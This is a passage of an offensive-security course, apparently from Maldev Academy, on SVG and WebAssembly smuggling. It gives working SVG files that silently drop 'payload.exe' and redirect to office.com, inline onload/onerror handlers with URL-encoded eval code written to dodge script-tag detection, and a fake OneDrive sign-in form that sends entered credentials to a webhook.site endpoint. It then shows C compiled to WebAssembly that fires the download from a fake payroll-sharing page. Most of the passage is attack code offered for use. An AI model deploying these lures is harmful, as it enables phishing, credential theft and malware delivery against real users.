Another interesting strategy used during SVG smuggling is immediately redirecting the user after smuggling the payload in order to make it appear as if the download originated from a legitimate website. We modify the previous SVG smuggling template to add `location.href = "https://office.com"` to redirect to a legitimate website after the download occurs. Additionally, the SVG canvas is styled to be invisible to prevent the user from seeing the image before redirection.

```
<?xml version="1.0" encoding="UTF-8"?>
<svg
  width="800px"
  height="800px"
  viewBox="0 0 48 48"
  id="a"
  xmlns="http://www.w3.org/2000/svg"
>
  <!-- Script -->
  <script type="text/javascript">
  <![CDATA[
    // Custom base64 decoder function
    function decodeBase64(base64Payload) {
      const base64 = base64Payload.replace(/[^A-Za-z0-9+/]/g, '');
      const output = [];
      const table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';

      for (let i = 0, buffer = 0, bits = 0; i < base64.length; i++) {
        const val = table.indexOf(base64.charAt(i));
        if (val === -1) continue;

        buffer = (buffer << 6) | val;
        bits += 6;

        if (bits >= 8) {
          bits -= 8;
          output.push((buffer >> bits) & 0xff);
        }
      }

      const length = output.length;
      const arrType = Uint8Array;
      const array = new arrType(length);
      for (let j = 0; j < length; j++) {
        array[j] = output[j];
      }

      return array;
    }

    function triggerDownload(data, filename) {
      const blobData = new Blob([data], { type: 'application/zip' });
      const makeURL = (self.URL || self.webkitURL).createObjectURL;
      const url = makeURL(blobData);

      const anchor = document.createElementNS('http://www.w3.org/1999/xhtml', 'a');
      anchor.href = url;
      anchor.download = filename;
      anchor.style.display = 'none';

      document.documentElement.appendChild(anchor);

      const evt = new MouseEvent('click', {
        view: window,
        bubbles: true,
        cancelable: true
      });
      anchor.dispatchEvent(evt);
    }

    const base64Payload = 'c2FtcGxlYmlu'; // Base64-encoded binary file
    const fileName = 'payload.exe';

    const byteArray = decodeBase64(base64Payload);
    triggerDownload(byteArray, fileName);
    location.href = "https://office.com";
  ]]>
</script>

  <defs>
    <style>
      .b{ 
        fill: none;
      }
      .c {
        fill: none;
        stroke: none;
        stroke-linecap: round;
        stroke-linejoin: round;
      }
    </style>
  </defs>
  <path class="c" d="M13.8571,15.1364h20.2857" />
  <path
    class="c"
    d="M28.0519,8.5519c0-2.2378-1.8141-4.0519-4.0519-4.0519s-4.0519,1.8141-4.0519,4.0519H9.2987V43.5h29.4026V8.5519h-10.6494Z"
  />
  <circle class="b" cx="24" cy="8.5519" r=".75" />
</svg>

```
The video can be found in folder: `./videos/smuggle_redirect.mp4`

## SVG Image Element
Another strategy used with SVG smuggling is the usage of images to make the user more likely to interact and trust the file. To do this, we will use the SVG image element to embed two images. The first will be a blurred background image of the OneDrive home page:

Next, we will use HTML to generate a box indicating that a document has been shared and a download has started, then take a screenshot of the rendered HTML. This image will be overlaid on top of the blurred OneDrive background. You can render the HTML below in your browser or through an online HTML renderer like htmledit.squarefree.com.

```
<head>
  <style>
    body {
      background-color: #f3f3f3;
      font-family: "Segoe UI", sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .onedrive-box {
      background-color: #F0F0F0F0;
      border: 1px solid #d1d1d1;
      border-radius: 8px;
      padding: 100px 100px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      max-width: 600px;
      text-align: center;
    }

    .onedrive-box h2 {
      color: #0078d4;
      margin-bottom: 24px;
      font-size: 28px;
    }

    .onedrive-box p {
      color: #333;
      font-size: 18px;
      margin: 14px 0;
    }

    .status {
      color: #0078d4;
      font-weight: bold;
      margin-top: 30px;
      font-size: 18px;
    }
  </style>
</head>
<body>
  <div class="onedrive-box">
    <h2>OneDrive</h2>
    <p><strong>john@example.com</strong> shared a document with you.</p>
    <p class="status">Download has started...</p>
  </div>
</body>
</html>

```

With the images prepared, we will convert them into Base64 and embed them directly inside of our SVG. Encoding images to Base64 can be done through the command line or through an online tool such as base64-image.de. Replace both instances of `<BASE64>` with the encoded images' Base64 blobs. Lastly, embed the `<script>` tags inside the `<svg>` tags to smuggle the payload.

```
<?xml version="1.0" encoding="UTF-8"?>
<svg
  xmlns="http://www.w3.org/2000/svg"
  xmlns:xlink="http://www.w3.org/1999/xlink"
  width="100%"
  height="100%"
  viewBox="0 0 800 600"
  preserveAspectRatio="none"
>
  <!-- Blurred onedrive image. Replace <BASE64> with the blurred background image -->
  <image
    x="0"
    y="0"
    width="100%"
    height="100%"
    preserveAspectRatio="none"
    xlink:href="data:image/png;base64,<BASE64>"
  />

  <!-- Overlay image. Replace <BASE64> with the overlay image. -->
  <image
    width="250"
    height="200"
    x="300"
    y="200"
    xlink:href="data:image/png;base64,<BASE64>"
  />

  <!-- Script -->
  <script type="text/javascript">
  <![CDATA[
    // Custom base64 decoder function
    function decodeBase64(base64Payload) {
      const base64 = base64Payload.replace(/[^A-Za-z0-9+/]/g, '');
      const output = [];
      const table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';

      for (let i = 0, buffer = 0, bits = 0; i < base64.length; i++) {
        const val = table.indexOf(base64.charAt(i));
        if (val === -1) continue;

        buffer = (buffer << 6) | val;
        bits += 6;

        if (bits >= 8) {
          bits -= 8;
          output.push((buffer >> bits) & 0xff);
        }
      }

      const length = output.length;
      const arrType = Uint8Array;
      const array = new arrType(length);
      for (let j = 0; j < length; j++) {
        array[j] = output[j];
      }

      return array;
    }

    function triggerDownload(data, filename) {
      const blobData = new Blob([data], { type: 'application/zip' });
      const makeURL = (self.URL || self.webkitURL).createObjectURL;
      const url = makeURL(blobData);

      const anchor = document.createElementNS('http://www.w3.org/1999/xhtml', 'a');
      anchor.href = url;
      anchor.download = filename;
      anchor.style.display = 'none';

      document.documentElement.appendChild(anchor);

      const evt = new MouseEvent('click', {
        view: window,
        bubbles: true,
        cancelable: true
      });
      anchor.dispatchEvent(evt);
    }

    const base64Payload = 'c2FtcGxlYmlu'; // Base64-encoded binary file
    const fileName = 'payload.exe';

    const byteArray = decodeBase64(base64Payload);
    triggerDownload(byteArray, fileName);
  ]]>
  </script>
</svg>

```

## Executing Inline JavaScript
One way of detecting the SVG files that we previously created is by analyzing the file for embedded `<script>` tags, as this can be an indicator of SVG smuggling. An alternative way of executing JavaScript which evades that detection rule is through using inline event attributes which trigger upon a certain action occurring. Some commonly used inline event attributes are:

- `onload` – Executes when an element and its resources have finished loading, allowing you to run code as soon as the page is ready.

- `onerror` – Triggers when an element (e.g. image) fails to load, allowing or error handling.

- `onmouseover` – Executes when the user’s pointer moves over an element.

- `onclick` – Runs when the user clicks on an element.

For example, in the SVG below, we added an `onload` attribute to the `<svg>` element that will trigger an alert box upon the page loading.

```
<?xml version="1.0" encoding="UTF-8"?>
<svg
  width="800px"
  height="800px"
  viewBox="0 0 48 48"
  id="a"
  xmlns="http://www.w3.org/2000/svg"
  onload="alert('Hello!');"
>
  <defs>
    <style>
      .b{ 
        fill: #000000;
      }
      .c {
        fill: none;
        stroke: #000000;
        stroke-linecap: round;
        stroke-linejoin: round;
      }
    </style>
  </defs>
  <path class="c" d="M13.8571,15.1364h20.2857" />
  <path
    class="c"
    d="M28.0519,8.5519c0-2.2378-1.8141-4.0519-4.0519-4.0519s-4.0519,1.8141-4.0519,4.0519H9.2987V43.5h29.4026V8.5519h-10.6494Z"
  />
  <circle class="b" cx="24" cy="8.5519" r=".75" />
</svg>

```

### Smuggling With Onload Attribute
Instead of using the `alert()` function, we'll replace it with our smuggling script. Since special characters can cause parsing issues, we minimized and URL-encoded the entire script and included it inside `eval(decodeURIComponent(...))` for dynamic decoding and execution.

```
<?xml version="1.0" encoding="UTF-8"?>
<svg
  width="800px"
  height="800px"
  viewBox="0 0 48 48"
  id="a"
  xmlns="http://www.w3.org/2000/svg"
  onload="eval(decodeURIComponent('function%20decodeBase64%28base64Payload%29%7Bconst%20base64%3Dbase64Payload.replace%28%2F%5B%5EA-Za-z0-9%2B%2F%5D%2Fg%2C%27%27%29%3Bconst%20output%3D%5B%5D%3Bconst%20table%3D%27ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789%2B%2F%27%3Bfor%28let%20i%3D0%2Cbuffer%3D0%2Cbits%3D0%3Bi%3Cbase64.length%3Bi%2B%2B%29%7Bconst%20val%3Dtable.indexOf%28base64.charAt%28i%29%29%3Bif%28val%3D%3D%3D-1%29continue%3Bbuffer%3D%28buffer%3C%3C6%29%7Cval%3Bbits%2B%3D6%3Bif%28bits%3E%3D8%29%7Bbits-%3D8%3Boutput.push%28%28buffer%3E%3Ebits%29%26255%29%3B%7D%7Dconst%20length%3Doutput.length%3Bconst%20arrType%3DUint8Array%3Bconst%20array%3Dnew%20arrType%28length%29%3Bfor%28let%20j%3D0%3Bj%3Clength%3Bj%2B%2B%29%7Barray%5Bj%5D%3Doutput%5Bj%5D%3B%7Dreturn%20array%3B%7Dfunction%20triggerDownload%28data%2Cfilename%29%7Bconst%20blobData%3Dnew%20Blob%28%5Bdata%5D%2C%7Btype%3A%27application%2Fzip%27%7D%29%3Bconst%20makeURL%3D%28self.URL%7C%7Cself.webkitURL%29.createObjectURL%3Bconst%20url%3DmakeURL%28blobData%29%3Bconst%20anchor%3Ddocument.createElementNS%28%27http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml%27%2C%27a%27%29%3Banchor.href%3Durl%3Banchor.download%3Dfilename%3Banchor.style.display%3D%27none%27%3Bdocument.documentElement.appendChild%28anchor%29%3Bconst%20evt%3Dnew%20MouseEvent%28%27click%27%2C%7Bview%3Awindow%2Cbubbles%3Atrue%2Ccancelable%3Atrue%7D%29%3Banchor.dispatchEvent%28evt%29%3B%7Dconst%20base64Payload%3D%27c2FtcGxlYmlu%27%3Bconst%20fileName%3D%27payload.exe%27%3Bconst%20byteArray%3DdecodeBase64%28base64Payload%29%3BtriggerDownload%28byteArray%2CfileName%29%3B'))"
>
  <defs>
    <style>
      .b{ 
        fill: #000000;
      }
      .c {
        fill: none;
        stroke: #000000;
        stroke-linecap: round;
        stroke-linejoin: round;
      }
    </style>
  </defs>
  <path class="c" d="M13.8571,15.1364h20.2857" />
  <path
    class="c"
    d="M28.0519,8.5519c0-2.2378-1.8141-4.0519-4.0519-4.0519s-4.0519,1.8141-4.0519,4.0519H9.2987V43.5h29.4026V8.5519h-10.6494Z"
  />
  <circle class="b" cx="24" cy="8.5519" r=".75" />
</svg>

```

### Smuggling With Onerror Attribute
Another frequently abused attribute for executing JavaScript is `onerror`, which fires when an element encounters a loading error, allowing inline code execution. The code snippet below uses the `<image>` element, sets the `xlink:href` attribute to a non-existent file, and then uses the `onerror` attribute to execute the smuggling script when the loading of the file fails.

```
<?xml version="1.0" encoding="UTF-8"?>
<svg
  xmlns="http://www.w3.org/2000/svg"
  xmlns:xlink="http://www.w3.org/1999/xlink"
  width="100%"
  height="100%"
  viewBox="0 0 800 600"
  preserveAspectRatio="none"
>

  <image
    x="0"
    y="0"
    width="100%"
    height="100%"
    preserveAspectRatio="none"
    xlink:href="non-existent-image.png"
    onerror="eval(decodeURIComponent('function%20decodeBase64%28base64Payload%29%7Bconst%20base64%3Dbase64Payload.replace%28%2F%5B%5EA-Za-z0-9%2B%2F%5D%2Fg%2C%27%27%29%3Bconst%20output%3D%5B%5D%3Bconst%20table%3D%27ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789%2B%2F%27%3Bfor%28let%20i%3D0%2Cbuffer%3D0%2Cbits%3D0%3Bi%3Cbase64.length%3Bi%2B%2B%29%7Bconst%20val%3Dtable.indexOf%28base64.charAt%28i%29%29%3Bif%28val%3D%3D%3D-1%29continue%3Bbuffer%3D%28buffer%3C%3C6%29%7Cval%3Bbits%2B%3D6%3Bif%28bits%3E%3D8%29%7Bbits-%3D8%3Boutput.push%28%28buffer%3E%3Ebits%29%26255%29%3B%7D%7Dconst%20length%3Doutput.length%3Bconst%20arrType%3DUint8Array%3Bconst%20array%3Dnew%20arrType%28length%29%3Bfor%28let%20j%3D0%3Bj%3Clength%3Bj%2B%2B%29%7Barray%5Bj%5D%3Doutput%5Bj%5D%3B%7Dreturn%20array%3B%7Dfunction%20triggerDownload%28data%2Cfilename%29%7Bconst%20blobData%3Dnew%20Blob%28%5Bdata%5D%2C%7Btype%3A%27application%2Fzip%27%7D%29%3Bconst%20makeURL%3D%28self.URL%7C%7Cself.webkitURL%29.createObjectURL%3Bconst%20url%3DmakeURL%28blobData%29%3Bconst%20anchor%3Ddocument.createElementNS%28%27http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml%27%2C%27a%27%29%3Banchor.href%3Durl%3Banchor.download%3Dfilename%3Banchor.style.display%3D%27none%27%3Bdocument.documentElement.appendChild%28anchor%29%3Bconst%20evt%3Dnew%20MouseEvent%28%27click%27%2C%7Bview%3Awindow%2Cbubbles%3Atrue%2Ccancelable%3Atrue%7D%29%3Banchor.dispatchEvent%28evt%29%3B%7Dconst%20base64Payload%3D%27c2FtcGxlYmlu%27%3Bconst%20fileName%3D%27payload.exe%27%3Bconst%20byteArray%3DdecodeBase64%28base64Payload%29%3BtriggerDownload%28byteArray%2CfileName%29%3B'))"
  />
</svg>

```

## SVG ForeignObject Element
SVGs support a `foreignObject` element which allows embedding HTML content and JavaScript directly inside the SVG canvas. The embedded HTML must declare the XHTML namespace (i.e. `xmlns="http://www.w3.org/1999/xhtml"`) so browsers parse it correctly. Using the `foreignObject` element we can include interactive elements like input fields, buttons and submission forms within the SVG. The example below demonstrates embedding HTML/JS in an SVG by using the `foreignObject` element with a `<body xmlns="http://www.w3.org/1999/xhtml">` child to ensure proper XHTML parsing:

```
<?xml version="1.0" encoding="UTF-8"?>
<svg
  xmlns="http://www.w3.org/2000/svg"
  xmlns:xlink="http://www.w3.org/1999/xlink"
  width="100%"
  height="100%"
  viewBox="0 0 800 600"
  preserveAspectRatio="none"
>

    <foreignObject x="0" y="0" width="100%" height="100%"> <!-- foreignObject SVG element -->
    <body xmlns="http://www.w3.org/1999/xhtml"> <!-- Extended HTML namespace -->
        <!-- Place HTML/JS elements and scripts here -->
    </body>
    </foreignObject>

</svg>

```

### Weaponizing ForeignObject Element
We'll weaponize the `foreignObject` element by creating an SVG that sets a blurred OneDrive image as the background and overlays a login form. When the form is submitted, the credentials are exfiltrated to a remote endpoint, and a payload is smuggled after a short delay. The delay is required to give time for the credentials to be sent to the remote endpoint. Finally, the user is then redirected away from the SVG to a legitimate site.

The `handleLogin` function performs the aforementioned actions by sending the credentials to a webhook.site endpoint, smuggling the payload and redirecting the user to `example.com`. Replace the `webhook.site` endpoint with your own generated one. The `handleLogin` function is called upon the submit button being clicked by setting the `onclick` attribute on the button.

The complete code for the SVG canvas utilizing the `foreignObject` element is shown below.

```
<?xml version="1.0" encoding="UTF-8"?>
<svg
  xmlns="http://www.w3.org/2000/svg"
  xmlns:xlink="http://www.w3.org/1999/xlink"
  width="100%"
  height="100%"
  viewBox="0 0 800 600"
  preserveAspectRatio="none"
>

  <image
    x="0"
    y="0"
    width="100%"
    height="100%"
    preserveAspectRatio="none"
    xlink:href="data:image/png;base64,iVBORw0KGgoAAAANS..."
    />

    <foreignObject x="0" y="0" width="100%" height="100%">
    <body xmlns="http://www.w3.org/1999/xhtml" style="margin:0; width:100%; height:100%; display:flex; align-items:center; justify-content:center; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;">
        <div style="width:250px; background:white; border-radius:8px; box-shadow:0 0 10px rgba(0,0,0,0.1); padding:20px;">
        <h2 style="margin-top:0; color:#0078d4;">OneDrive Sign in</h2>
        <form onsubmit="return false;">
            <label style="display:block; margin-bottom:5px;">Email</label>
            <input id="username" type="text" style="box-sizing:border-box; width:100%; padding:10px; margin-bottom:15px; border:1px solid #ccc; border-radius:4px;" />

            <label style="display:block; margin-bottom:5px;">Password</label>
            <input id="password" type="password" style="box-sizing:border-box; width:100%; padding:10px; margin-bottom:20px; border:1px solid #ccc; border-radius:4px;" />

            <button type="button" style="box-sizing:border-box; width:100%; background:#0078d4; color:white; padding:10px; border:none; border-radius:4px; margin-bottom: 10px;" onclick="handleLogin();">
            Sign in
            </button>
        </form>
        <script>
            <![CDATA[
                function handleLogin() {
                const u = encodeURIComponent(document.getElementById('username').value);
                const p = encodeURIComponent(document.getElementById('password').value);
                const img = new Image();
                img.src = 'https://webhook.site/361c8990-36ef-44c5-af45/?u=' + u + '&p=' + p;

                setTimeout(() => {
                    eval(decodeURIComponent('function%20decodeBase64%28base64Payload%29%7Bconst%20base64%3Dbase64Payload.replace%28%2F%5B%5EA-Za-z0-9%2B%2F%5D%2Fg%2C%27%27%29%3Bconst%20output%3D%5B%5D%3Bconst%20table%3D%27ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789%2B%2F%27%3Bfor%28let%20i%3D0%2Cbuffer%3D0%2Cbits%3D0%3Bi%3Cbase64.length%3Bi%2B%2B%29%7Bconst%20val%3Dtable.indexOf%28base64.charAt%28i%29%29%3Bif%28val%3D%3D%3D-1%29continue%3Bbuffer%3D%28buffer%3C%3C6%29%7Cval%3Bbits%2B%3D6%3Bif%28bits%3E%3D8%29%7Bbits-%3D8%3Boutput.push%28%28buffer%3E%3Ebits%29%26255%29%3B%7D%7Dconst%20length%3Doutput.length%3Bconst%20arrType%3DUint8Array%3Bconst%20array%3Dnew%20arrType%28length%29%3Bfor%28let%20j%3D0%3Bj%3Clength%3Bj%2B%2B%29%7Barray%5Bj%5D%3Doutput%5Bj%5D%3B%7Dreturn%20array%3B%7Dfunction%20triggerDownload%28data%2Cfilename%29%7Bconst%20blobData%3Dnew%20Blob%28%5Bdata%5D%2C%7Btype%3A%27application%2Fzip%27%7D%29%3Bconst%20makeURL%3D%28self.URL%7C%7Cself.webkitURL%29.createObjectURL%3Bconst%20url%3DmakeURL%28blobData%29%3Bconst%20anchor%3Ddocument.createElementNS%28%27http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml%27%2C%27a%27%29%3Banchor.href%3Durl%3Banchor.download%3Dfilename%3Banchor.style.display%3D%27none%27%3Bdocument.documentElement.appendChild%28anchor%29%3Bconst%20evt%3Dnew%20MouseEvent%28%27click%27%2C%7Bview%3Awindow%2Cbubbles%3Atrue%2Ccancelable%3Atrue%7D%29%3Banchor.dispatchEvent%28evt%29%3B%7Dconst%20base64Payload%3D%27c2FtcGxlYmlu%27%3Bconst%20fileName%3D%27payload.exe%27%3Bconst%20byteArray%3DdecodeBase64%28base64Payload%29%3BtriggerDownload%28byteArray%2CfileName%29%3Blocation.href%3D%27https%3A%2F%2Fexample.com%27%3B'));
                }, 1000);
                }
            ]]>
        </script>
        </div>
    </body>
    </foreignObject>
</svg>

```
The video can be found in folder: `./videos/foreignobject_demo.mp4`

## Resources

- SVG Smuggling: A picture worth a thousand words

- Obfuscated Files or Information: SVG Smuggling

## Objectives
Use Script tags inside an SVG file to redirect a user to an external website

Use inline JavaScript to smuggle a file upon the client's mouse hovering over the SVG

Use the SVG ForeignObject element to create a credential stealer and smuggle a file upon the credentials being captured


---

# Novo Módulo 8 — WebAssembly Smuggling

Novo Módulo 8 — WebAssembly Smuggling

- # Novo Módulo 8 — WebAssembly Smuggling

# Disclaimer
# Module 8 - WebAssembly Smuggling

## Introduction
WebAssembly or Wasm is a low-level binary format that can be executed in the browser alongside JavaScript. It allows developers to compile code written in low-level programming languages such as C, C++, and Rust into highly efficient modules. The main objective of using WebAssembly in legitimate uses is to improve performance, as JavaScript is a high-level, dynamically typed language that requires more overhead during execution. WebAssembly, by contrast, is a low-level binary format that runs closer to native machine code, allowing compute-intensive tasks to execute more efficiently within the browser environment.Additional high level objectives of WebAssembly beyond performance are outlined here and include goals such as portability, security, and support for non-browser environments. Furthermore, a variety of real world use cases that may benefit from using WebAssembly such as gaming, multimedia processing, and encryption are also documented here.This module will walk through the process of creating C binaries and compiling them into WebAssembly to use in our phishing website.
## WebAssembly For Smuggling
It's worth noting that using WebAssembly for smuggling has benefits over traditional HTML or SVG smuggling, specifically:
Creating binaries and executing them directly in the browser

- Obfuscating logic through compilation

- Avoiding common static signatures and string-based detection

- Bypassing some content filters that scan for typical HTML or JavaScript payloads

- Creating payloads written in low-level languages like C or Rust are harder to reverse

## Compiling C/C++ To WebAssembly With Emscripten
In this module, we will be building binaries using C, and therefore we will work with Emscripten, a toolchain that compiles C/C++ code into WebAssembly. Emscripten provides the necessary runtime support, standard libraries, and JavaScript bindings to run native-like code efficiently in the browser environment.

When C/C++ source code is compiled using Emscripten, three files are generated a Wasm module (`.wasm`), the JavaScript "glue" code that will load and run the module (`.js`), and an HTML document that shows the results of the code (`.html`). The diagram below is taken from Mozilla's official documentation on WebAssembly and illustrates the aforementioned process.

We can modify the compiler output settings to only generate the Wasm module and JavaScript glue code, providing us the flexibility to manually create the HTML document. This will be shown later in the module.

### Setting Up Emscripten
To setup Emscripten, run the commands below on a Linux-based machine:

```
# Clone the core emscripten SDK
git clone https://github.com/emscripten-core/emsdk.git
cd emsdk/

# Install latest SDK tools
./emsdk install latest

# Activate the SDK for the current user
./emsdk activate latest

# Set environment variables
source ./emsdk_env.sh 

# Verify that everything is setup correctly
emcc --help

```

Note: Using `source ./emsdk_env.sh` sets the environment variables temporarily until you close the terminal session. If you want to set them permanently, add `source /full/path/to/emsdk/emsdk_env.sh` to your shell’s startup file (e.g. `~/.bashrc`, `~/.zshrc`, or `~/.bash_profile`) so it's applied automatically each time you open a new terminal.

Once `emcc` is installed and setup, we can compile C binaries into WebAssembly. To do so, create a file named `temp.c` and paste the following C code inside:

```
#include <stdio.h>

int main() {
    printf("Hello World\n");
    return 0;
}

```
Compile the file using the following `emcc` command:

```
emcc temp.c -o test.html  -s ENVIRONMENT='web' -s MINIMAL_RUNTIME=1

```

- `-o test.html` - The name of the output file. In this case we set the output file to be called `test.html`.

- `-s ENVIRONMENT='web'` - Setting a build configuration flag ensuring the generated code targets only web browsers, not Node.js or other JS environments.

- `-s MINIMAL_RUNTIME=1` - Setting a build configuration flag to generate a much smaller JS glue code with only the essentials

The resulting output is three files: the Wasm module, JS glue code and HTML document, as previously mentioned.

Place all three files in the document root so they are accessible on your web server. Then, navigate to `test.html` and open the browser console where you should see the message "Hello World".

Additionally, under the "Network" tab, we can see that the three files are loaded.

## Using A Custom HTML Template
If we right-click on the page and select "View page source", we see Emscripten's minimal-runtime loader source code. When we added the `-s MINIMAL_RUNTIME=1` flag, Emscripten generated a lightweight HTML stub that asynchronously fetches `test.wasm` and `test.js`, wraps the JavaScript glue in a blob URL and attaches the WebAssembly bytes to the global `Module` object.

Because Emscripten’s default HTML shell is static and recognizable, security tools can easily flag it. A better approach is to supply your own template with the `--shell-file` flag. Emscripten scans the custom HTML for the placeholder `{{{ SCRIPT }}}` and injects its loader at that spot. For example, create an HTML file named `template.html` and insert the HTML content below:

```
<!DOCTYPE html>
<html>
<head>
  <title>Custom Template</title>
</head>
<body>
  <h1>Welcome To Maldev Academy</h1>

  <!-- Injects compiled JS/Wasm loader here -->
  {{{ SCRIPT }}}
</body>
</html>

```
Next, re-run the compiler command but this time we remove the `-s MINIMAL_RUNTIME=1` and replace it with `--shell-file template.html`.

```
emcc temp.c -o test.html  -s ENVIRONMENT='web' --shell-file template.html

```
Ensure `test.html` is accessible on your website and navigate to it via the browser. Our custom HTML should appear on the page along with the "Hello World" in the web console.

Analyzing the page source shows that Emscripten swapped the `{{{ SCRIPT }}}` placeholder for `<script>` elements whose `src` attribute point to the generated JavaScript glue code.

## Producing a Single File
It's also worth noting that Emscripten offers a way to embed both the `.js` and `.wasm` files directly into the HTML document. By using the `-s SINGLE_FILE=1` flag, Emscripten generates a single HTML file that contains all required assets inlined, eliminating the need for separate file requests. The command below generates `test.html` with all necessary assets embedded, using our previously created custom HTML template, `template.html`:

```
emcc temp.c -o test.html  -s ENVIRONMENT='web' -s SINGLE_FILE=1 --shell-file template.html

```
The page still prints the same heading as before along with displaying "Hello World" in the console, but this time the HTML file itself contains all the JavaScript glue and Base64-encoded Wasm bytes.

## Invoking JavaScript from C in WebAssembly
With the main compiler flags understood, we can now examine the APIs exposed by Emscripten’s header files, beginning with emscripten.h. The `emscripten.h` header file provides our C program an API for interacting with the browser and JavaScript functionalities. One of the macros provided in the header file is EM_JS, which lets us define a reusable JavaScript function that can be called from C as if it were a regular C function. The `EM_JS` function takes 4 arguments:

- `return_type` - The value type that the function returns.

- `function_name` - The identifier by which C code will call the JavaScript function.

- `arguments` - Parenthesized list of C arguments to pass through to JavaScript.

- `code` - The JavaScript body executed when the function is invoked.

In the example below, we create the `smuggle_file` function which smuggles `payload.exe` using the Data URI technique. The function is then called from the `main` function to be executed.

```
#include <emscripten/emscripten.h>

EM_JS(void, smuggle_file, (void), {
  const base64Data = "c2FtcGxlYmlu";
  const fileDataUri = "data:image/png;base64," + base64Data;
  const a = document.createElement("a");
  a.href = fileDataUri;
  a.download = "payload.exe";
  document.body.appendChild(a);
  setTimeout(() => { a.click(); document.body.removeChild(a); }, 0);
});

int main() {
  smuggle_file();
  return 0;
}

```
Additionally, we'll update our `template.html` file to use a more realistic layout. The updated HTML template below resembles a file sharing interface that's similar to the OneDrive sharing layout.

```
<!DOCTYPE html>
<html>
<head>
  <title>File Shared</title>
  <style>
    body {
      font-family: "Segoe UI", sans-serif;
      background: #f2f2f2;
      margin: 0;
      padding: 40px;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .card {
      background: white;
      width: 450px;
      padding: 30px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      border-radius: 8px;
      text-align: center;
    }
    .icon {
      width: 40px;
      height: 40px;
      margin: 0 auto 10px;
    }
    .icon svg {
      width: 100%;
      height: 100%;
      fill: #0078d4;
    }
    .file-box {
      border: 1px solid #ccc;
      border-radius: 6px;
      padding: 12px;
      margin: 20px 0;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .file-box img {
      width: 24px;
      margin-right: 10px;
    }
    .small-note {
      color: #666;
      font-size: 13px;
      margin-top: 8px;
    }
    #dlFile {
      margin-top: 20px;
      background: #0078d4;
      color: white;
      border: none;
      padding: 12px 20px;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
    }
    .footer {
      font-size: 12px;
      margin-top: 40px;
      color: #666;
      text-align: center;
    }
    .footer img {
      vertical-align: middle;
      height: 14px;
    }
    .logo {
      position: absolute;
      bottom: 20px;
      right: 20px;
    }
  </style>
</head>
<body>

<div class="card">
    <div class="icon">
    <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
      <path d="M0 25.472q0 2.368 1.664 4.032t4.032 1.664h18.944q2.336 0 4-1.664t1.664-4.032v-8.192l-3.776 3.168v5.024q0 0.8-0.544 1.344t-1.344 0.576h-18.944q-0.8 0-1.344-0.576t-0.544-1.344v-18.944q0-0.768 0.544-1.344t1.344-0.544h9.472v-3.776h-9.472q-2.368 0-4.032 1.664t-1.664 4v18.944zM5.696 19.808q0 2.752 1.088 5.28 0.512-2.944 2.24-5.344t4.288-3.872 5.632-1.664v5.6l11.36-9.472-11.36-9.472v5.664q-2.688 0-5.152 1.056t-4.224 2.848-2.848 4.224-1.024 5.152zM32 22.080v0 0 0z"/>
    </svg>
  </div>
  <h3>Jack Bob shared a file with you</h3>
  <p>Please review the attached document</p>

  <div class="file-box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fd/Microsoft_Office_Word_%282019%E2%80%93present%29.svg/2203px-Microsoft_Office_Word_%282019%E2%80%93present%29.svg.png">
    <span>Updated Payroll Schedule</span>
  </div>

  <div class="small-note">This link only works for the direct recipients of this message.</div>

  <button id="dlFile">Download</button>
  {{{ SCRIPT }}}
</div>
</body>
</html>

```
Compile the file using the command below and passing the new template, then navigate to the resulting page (`smuggle.html`) and the download should immediately start.

```
emcc smuggle.c -o smuggle.html --shell-file=template.html

```

### Exporting Functions
In the previous example the download began as soon as the page loaded because `smuggle_file()` is invoked inside `main`, and `main` runs automatically when the Wasm module initializes. This behavior does not suit our phishing template since the user expects the download to start upon clicking the "Download" button. Therefore, we must modify the C to export the smuggling function and invoke it upon the button being clicked.

The updated C snippet below creates a new function called `smuggle_payload()` which calls the `smuggle_file` function declared with `EM_JS`. We then use the EMSCRIPTEN_KEEPALIVE macro to tell the compiler and linker to preserve the `smuggle_payload` function so it remains accessible from JavaScript at runtime. Furthermore, the `main` function does not invoke any function because the exported `smuggle_payload` will be called manually from JavaScript.

```
#include <emscripten/emscripten.h>

EM_JS(void, smuggle_file, (void), {
  const base64Data = "c2FtcGxlYmlu";
  const fileDataUri = "data:image/png;base64," + base64Data;
  const a = document.createElement("a");
  a.href = fileDataUri;
  a.download = "payload.exe";
  document.body.appendChild(a);
  setTimeout(() => { a.click(); document.body.removeChild(a); }, 0);
});

void EMSCRIPTEN_KEEPALIVE smuggle_payload() {
  smuggle_file();
}

int main() {
  return 0;
}

```
Compile the snippet using the command below. The command uses the `-s EXPORTED_FUNCTIONS` flag to make the `smuggle_payload` accessible from the compiled code via JavaScript. We also use the `EXPORTED_RUNTIME_METHODS` flag to export ccall, which will be used to call `smuggle_payload` in our HTML document. The `ccall` function takes X arguments:

- `ident` – C function name as a string.

- `returnType` – return type.

- `argTypes` – array of argument types.

- `args` – array of argument values.

- `opts` – Settings object for extra flags. This is optional.

```
emcc smuggle.c -o smuggle.js -s EXPORTED_FUNCTIONS=_smuggle_payload,_main -s EXPORTED_RUNTIME_METHODS=['ccall'] -s ENVIRONMENT=web

```
Our HTML document remains largely the same; the only change is adding a `<script>` tag for `smuggle.js` and a short inline script that attaches a click listener to the download button. When the button is pressed, `Module.ccall("smuggle_payload", null, [], [])` runs, which triggers the exported WebAssembly function.

```
<div class="card">
...
...
<button id="dlFile">Download</button>
</div>
